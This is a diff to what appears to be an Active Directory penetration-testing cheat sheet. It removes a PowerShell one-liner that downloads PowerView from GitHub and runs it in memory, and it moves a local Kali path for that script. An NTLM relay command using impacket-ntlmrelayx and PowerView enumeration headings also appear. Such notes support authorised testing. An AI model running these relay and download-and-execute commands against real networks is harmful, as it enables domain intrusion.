@@ -97,9 +97,9 @@ impacket-ntlmrelayx -tf targets.txt -smb2support
 impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
 ```
 
-## Download PowerView
-```powershell
-IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
+## PowerView (Kali Source)
+```
+/usr/share/windows-resources/powersploit/Recon/PowerView.ps1
 ```
 
 ## PowerView enumerate domain
@@ -144,10 +144,6 @@ Get-DomainGPO
 Get-DomainGPO | Select-Object displayname,gpcfilesyspath
 ```
 
-## PowerView (Kali Source)
-```
-/usr/share/windows-resources/powersploit/Recon/PowerView.ps1
-```
 
 ## SharpHound (Kali Source)
 ```
